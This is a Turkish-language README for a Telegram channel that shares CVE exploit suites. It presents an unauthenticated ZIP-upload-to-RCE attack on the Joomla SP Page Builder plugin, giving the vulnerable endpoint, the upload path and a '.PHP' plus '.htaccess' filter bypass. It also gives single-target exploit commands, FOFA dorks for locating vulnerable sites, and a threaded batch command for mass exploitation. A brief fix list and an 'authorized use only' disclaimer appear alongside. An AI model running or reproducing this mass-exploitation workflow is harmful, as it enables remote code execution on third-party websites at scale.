<div align="center">

# winrarzipsexploit

<a href="https://t.me/winrarzipsteam">
  <img src="https://img.shields.io/badge/📢_TELEGRAM_CHANNEL-winrarzipsexploit-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white&labelColor=0d1117" alt="Telegram Channel"/>
</a>

<br/><br/>

<h1><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=700&size=28&duration=3000&pause=800&color=FF0000&center=true&vCenter=true&width=500&lines=Nothing+Is+Impossible;CVE+Research+%26+Exploit+Suites" alt="Nothing Is Impossible"/></h1>

<br/>

<i>“Siber güvenlik sadece hack değil — önemli olanı korumaktır.”</i>

<br/><br/>

<img src="https://capsule-render.vercel.app/api?type=soft&color=990000&height=2&section=header" width="80%"/>

</div>

---

### ▼ About

Bu kanal ve profil **CVE araştırması, PoC/suite paylaşımı ve savunma bilgisi** içindir.

Her CVE paylaşımında şunları veriyoruz:

| Bölüm | İçerik |
|-------|--------|
| **Etkilenen ürün** | Plugin / CMS / sürüm aralığı |
| **Vektör** | Hangi endpoint, kimlik doğrulama gerekir mi |
| **Fix** | Patch sürümü, geçici önlem, WAF notu |
| **Tek hedef tarama** | Fingerprint + tek URL PoC komutu |
| **Toplu tarama** | FOFA dork + batch suite örneği |

> ⚠️ **Yalnızca yetkili test / kendi lab ortamın.** İzinsiz kullanım yasa dışıdır.

📡 **Telegram:** [winrarzipsexploit](https://t.me/winrarzipsteam)

---

### 📋 CVE Paylaşım Şablonu

Her yeni CVE Telegram'da ve burada şu formatta:

```
╔══════════════════════════════════════╗
║  CVE-XXXX-XXXXX — [Ürün Adı]         ║
╠══════════════════════════════════════╣
║  Etkilenen : ... <= x.x.x            ║
║  Fixed     : ... x.x.x+              ║
║  Severity  : Critical / High / ...   ║
║  Auth      : Unauth / Admin / ...    ║
║  Vector    : POST ... → RCE / LFI    ║
╠══════════════════════════════════════╣
║  FIX                                       ║
║  • Plugin/core güncelle                    ║
║  • /upload dizininde PHP exec kapat        ║
║  • WAF / Imunify / Cloudflare              ║
╠══════════════════════════════════════╣
║  TEK HEDEF  →  python Suite.py -u URL      ║
║  TOPLU      →  python Suite.py -f list.txt ║
╚══════════════════════════════════════╝
```

---

### 🔴 Örnek — CVE-2026-48908

**SP Page Builder (Joomla `com_sppagebuilder`) — Unauthenticated ZIP Upload → RCE**

| | |
|---|---|
| **Etkilenen** | SP Page Builder **≤ 6.6.1** (Joomla eklentisi) |
| **Fixed** | **6.6.2+** — upload artık admin ister |
| **Vektör** | `index.php?option=com_sppagebuilder&task=asset.uploadCustomIcon` |
| **Yazılan yer** | `/media/com_sppagebuilder/assets/iconfont/<pack>/fonts/` |
| **Bypass** | `.PHP` + `fonts/.htaccess` (case-sensitive filter) |

#### 🛡️ Nasıl fixlenir?

1. **SP Page Builder → 6.6.2 veya üzeri** güncelle
2. `/media/com_sppagebuilder/` altında **PHP execution kapat** (Apache: `php_flag engine off`, nginx: location deny)
3. **AllowOverride** kapalı tut — `.htaccess` ile PHP register edilemesin
4. WAF: `custom_icon` ZIP upload POST'unu rate-limit / Imunify rule

#### 🎯 Tek hedef tarama

```bash
# Fingerprint
python CVE-2026-48908-Suite.py -u https://hedef.com --fingerprint

# Tek hedef exploit (yetkili lab)
python CVE-2026-48908-Suite.py -u https://hedef.com --yes
```

Beklenen çıktı:

```
[+] https://hedef.com -> https://hedef.com/media/.../fonts/xxxxx.PHP
[-] https://hedef.com -> patched_662_plus    # güncel
[-] https://hedef.com -> upload_rejected     # filter/WAF
[-] https://hedef.com -> waf_cloudflare      # WAF
```

#### 📦 Toplu tarama (FOFA / domain listesi)

**FOFA dork:**
```
body="com_sppagebuilder"
body="/media/com_sppagebuilder/"
```

**Batch:**
```bash
python CVE-2026-48908-Suite.py -f targets.txt --yes --threads 15
```

`targets.txt` → her satırda bir root URL (`https://site.com`)

Sonuç dosyaları:
- `panels_48908.txt` — verify OK paneller
- `uploads_ok.txt` — upload OK, manuel doğrula

---

### 📂 Paylaşılan CVE Suite'ler

| CVE | Ürün | Durum |
|-----|------|-------|
| CVE-2026-48908 | Joomla SP Page Builder | ✅ Paylaşıldı |
| CVE-2026-48907 | JCE (Joomla) | 🔜 Yakında |
| CVE-2026-87930 | Joomla multi-plugin chain | 🔜 Yakında |

> Yeni CVE suite'ler önce [Telegram](https://t.me/winrarzipsteam)'da duyurulur, ardından repo linki eklenir.

---

### 💻 Tech Stack

<div align="center">

![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
![PHP](https://img.shields.io/badge/PHP-777BB4?style=for-the-badge&logo=php&logoColor=white)
![Joomla](https://img.shields.io/badge/Joomla-5091CD?style=for-the-badge&logo=joomla&logoColor=white)
![WordPress](https://img.shields.io/badge/WordPress-21759B?style=for-the-badge&logo=wordpress&logoColor=white)
![Burp Suite](https://img.shields.io/badge/Burp_Suite-FF6633?style=for-the-badge&logo=burp-suite&logoColor=white)
![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)

</div>

---

### 🌐 Connect

<div align="center">

<a href="https://t.me/winrarzipsteam">
  <img src="https://img.shields.io/badge/Telegram-@winrarzipsexploit-2CA5E0?style=flat-square&logo=telegram&logoColor=white" alt="Telegram Channel"/>
</a>

</div>

<br/>

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=990000&height=100&section=footer&text=BY%3A%20winrarzipsexploit&fontSize=20&fontColor=ffffff&animation=twinkling" width="100%"/>

</div>
